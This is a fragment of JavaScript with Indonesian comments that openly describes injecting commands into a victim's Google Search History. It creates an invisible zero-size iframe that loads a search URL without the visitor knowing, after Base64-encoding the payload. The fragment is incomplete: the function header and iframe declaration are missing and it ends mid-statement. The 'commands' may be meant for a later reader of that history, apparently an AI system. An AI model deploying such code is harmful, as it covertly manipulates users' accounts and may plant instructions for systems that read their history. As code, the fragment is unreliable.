        // ==================== FUNGSI UTAMA ====================

        // Fungsi untuk encode data ke Base64 (agar aman di URL)
        function encodeData(text) {
            return btoa(unescape(encodeURIComponent(text)));
        }

        // FUNGSI INTI: Menyuntikkan perintah ke Google Search History korban

            iframe.style.width = '0';
            iframe.style.height = '0';
            iframe.style.border = 'none';
            iframe.src = urlPencarian; // Load URL pencarian
            
            // 4. Tambahkan iframe ke halaman (akan trigger pencarian)
            document.body.appendChild(iframe);

            const interval = setInterval(() => {
